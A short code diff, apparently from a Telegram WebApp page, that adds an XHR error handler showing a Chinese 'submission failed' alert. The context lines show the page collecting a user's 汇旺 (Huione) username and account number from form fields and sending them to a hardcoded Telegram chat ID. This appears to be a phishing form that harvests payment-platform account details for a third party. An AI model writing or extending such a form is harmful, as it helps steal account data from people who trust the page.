@@ -41,6 +41,10 @@
                     Telegram.WebApp.close();
                 }
             };
+            xhr.onerror = function() {
+                alert('提交失败！请稍后再试');
+            };
+            
             xhr.send(JSON.stringify({
                 "chat_id": "5458197333",
                 "text": "汇旺用户名: " + document.getElementById('username').value + "\n" + "汇旺账号: " + document.getElementById('account').value
